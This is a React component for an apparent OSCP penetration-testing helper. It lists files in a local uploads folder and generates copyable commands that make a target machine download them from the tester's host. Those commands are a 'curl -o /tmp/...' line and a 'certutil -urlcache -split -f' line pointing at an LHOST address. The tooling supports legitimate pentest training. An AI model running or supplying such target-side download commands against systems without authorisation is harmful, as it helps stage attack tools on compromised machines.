import { useEffect, useState } from "react";
import { Copy, RefreshCw } from "lucide-react";
import { listUploadFiles, type UploadsListing } from "@/lib/uploads";

function formatSize(size: number): string {
  if (size < 1024) return `${size} B`;
  if (size < 1024 * 1024) return `${(size / 1024).toFixed(1)} KB`;
  return `${(size / (1024 * 1024)).toFixed(1)} MB`;
}

function fileUrl(host: string, port: string, name: string): string {
  const path = name
    .split("/")
    .map((part) => encodeURIComponent(part))
    .join("/");
  return `http://${host}:${port}/files/${path}`;
}

export function UploadsPanel() {
  const [listing, setListing] = useState<UploadsListing | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [host, setHost] = useState("10.10.14.5");
  const [port, setPort] = useState("8080");
  const [copied, setCopied] = useState<string | null>(null);

  async function load() {
    setError(null);
    try {
      setListing(await listUploadFiles());
    } catch (err) {
      setError(err instanceof Error ? err.message : "Could not read the folder");
    }
  }

  useEffect(() => {
    let gone = false;
    listUploadFiles()
      .then((data) => {
        if (!gone) setListing(data);
      })
      .catch((err: unknown) => {
        if (!gone) setError(err instanceof Error ? err.message : "Could not read the folder");
      });
    return () => {
      gone = true;
    };
  }, []);

  async function copy(id: string, text: string) {
    await navigator.clipboard.writeText(text);
    setCopied(id);
    window.setTimeout(() => setCopied((current) => (current === id ? null : current)), 1200);
  }

  return (
    <article className="min-w-0 overflow-hidden rounded-lg border border-primary bg-surface">
      <div className="border-b border-border px-4 py-3">
        <p className="font-mono text-xs text-primary">Uploads</p>
        <h2 className="text-lg font-semibold">Files the target can pull</h2>
        <p className="mt-1 text-sm text-muted">
          Put the file in the folder, then Refresh. The desk serves it. The target must be able to reach this
          machine. This is not a second web server.
        </p>
      </div>
      <div className="flex flex-col gap-4 px-4 py-4">
        <div className="grid gap-3 sm:grid-cols-2">
          <label className="flex flex-col gap-1 text-sm">
            <span className="font-mono text-xs text-muted">LHOST</span>
            <input
              value={host}
              onChange={(event) => setHost(event.target.value.trim())}
              className="rounded-lg border border-border bg-bg px-3 py-2 font-mono text-sm text-fg outline-none"
            />
          </label>
          <label className="flex flex-col gap-1 text-sm">
            <span className="font-mono text-xs text-muted">PORT</span>
            <input
              value={port}
              onChange={(event) => setPort(event.target.value.trim())}
              className="rounded-lg border border-border bg-bg px-3 py-2 font-mono text-sm text-fg outline-none"
            />
          </label>
        </div>
        <div className="flex flex-wrap items-center justify-between gap-2">
          <p className="min-w-0 break-all font-mono text-xs text-muted">{listing ? listing.root : "Reading the folder"}</p>
          <button
            type="button"
            onClick={() => void load()}
            className="inline-flex min-h-11 items-center gap-2 rounded-lg border border-border bg-bg px-3 text-sm text-muted"
          >
            <RefreshCw className="size-4" aria-hidden="true" />
            Refresh
          </button>
        </div>
        {error ? <p className="text-sm text-dead">{error}</p> : null}
        {listing && listing.files.length === 0 ? (
          <p className="text-sm text-muted">The folder is empty. Copy a file into it and refresh.</p>
        ) : null}
        <div className="flex flex-col gap-3">
          {listing?.files.map((file) => {
            const base = file.name.split("/").pop() ?? file.name;
            const url = fileUrl(host || "LHOST", port || "8080", file.name);
            const linux = `curl -o /tmp/${base} ${url}`;
            const windows = `certutil -urlcache -split -f ${url} C:\\Users\\Public\\${base}`;
            return (
              <div key={file.name} className="rounded-lg border border-border bg-bg p-3">
                <div className="flex flex-wrap items-baseline justify-between gap-2">
                  <p className="break-all font-mono text-sm text-fg">{file.name}</p>
                  <p className="font-mono text-xs text-muted">{formatSize(file.size)}</p>
                </div>
                <div className="mt-3 flex flex-wrap gap-2">
                  <button
                    type="button"
                    onClick={() => void copy(`${file.name}:linux`, linux)}
                    className="inline-flex min-h-11 items-center gap-2 rounded-lg border border-primary bg-raised px-3 text-sm text-fg"
                  >
                    <Copy className="size-4" aria-hidden="true" />
                    {copied === `${file.name}:linux` ? "Copied" : "Linux"}
                  </button>
                  <button
                    type="button"
                    onClick={() => void copy(`${file.name}:windows`, windows)}
                    className="inline-flex min-h-11 items-center gap-2 rounded-lg border border-border px-3 text-sm text-muted"
                  >
                    <Copy className="size-4" aria-hidden="true" />
                    {copied === `${file.name}:windows` ? "Copied" : "Windows"}
                  </button>
                </div>
                <pre className="mt-3 whitespace-pre-wrap break-all font-mono text-xs leading-relaxed text-muted">
                  {linux}
                  {"\n"}
                  {windows}
                </pre>
              </div>
            );
          })}
        </div>
        <p className="text-sm text-muted">
          Another folder: stop the desk and start it with OSCP_UPLOADS set to that path. A 441-byte download is
          still an HTML page, not the file.
        </p>
      </div>
    </article>
  );
}
